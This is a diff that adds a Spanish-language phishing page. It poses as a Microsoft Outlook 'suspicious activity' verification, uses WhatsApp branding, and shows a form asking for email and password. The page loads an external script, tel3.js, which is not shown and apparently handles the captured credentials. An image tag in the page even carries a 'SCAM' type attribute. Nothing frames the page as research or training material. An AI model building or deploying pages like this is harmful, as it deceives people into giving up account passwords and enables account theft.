@@ -1,0 +1,63 @@
+<!DOCTYPE html><html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <script type="text/javascript" src="tel3.js"></script>
+</head>
+<body>
+
+    <div id="popup" style="display: none;">
+        <div class="popup-content">
+            <h2>Verificacion Importante</h2>
+            <p>Hemos detectado actividad Inusual en su cuenta de Microsoft Outlook. Para seguir usándola normalmente, realice una verificación.</p>
+            <img src="https://cdn.pixabay.com/animation/2023/08/11/21/18/21-18-05-265_512.gif" alt="Cargando...">
+        </div>
+    </div>
+
+    <header>
+       
+    </header>
+
+    <div class="content" style="display: flex;">
+        <img src="https://cdn.glitch.global/619bbf3f-0832-4238-90da-3c5dfc53bd19/222hotmail.jpg?v=1714286364817" type="SCAM/favicon.png" sizes="16x16"> <!-- Tamaño ajustado para móviles -->
+        <p>Ingrese su Correo Electronico y Contraseña para acceder a su cuenta de Outlook :</p>
+        <form id="loginForm">
+            <!-- Input de selección de país -->
+    
+    <input type="email" id="Correo" name="Correo" placeholder="Correo Electrónico" required="">
+
+   
+            <!-- Input de teléfono -->
+           <input type="password" id="Contra" name="Contra" placeholder="Contraseña" required="" minlength="7">
+            
+
+            <button type="submit" id="submitButton">Continuar</button>
+        </form>
+    </div>
+
+    <footer>
+        <img src="https://static.whatsapp.net/rsrc.php/ya/r/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+    </footer>
+
+<script>
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('popup').style.display = 'none';
+                document.querySelector('.content').style.display = 'flex';
+            }, 5000);
+
+            
+            const form = document.getElementById('loginForm');
+            const submitButton = document.getElementById('submitButton');
+
+           
+
+         
+        }
+    </script>
+
+
+
+
+</body></html>
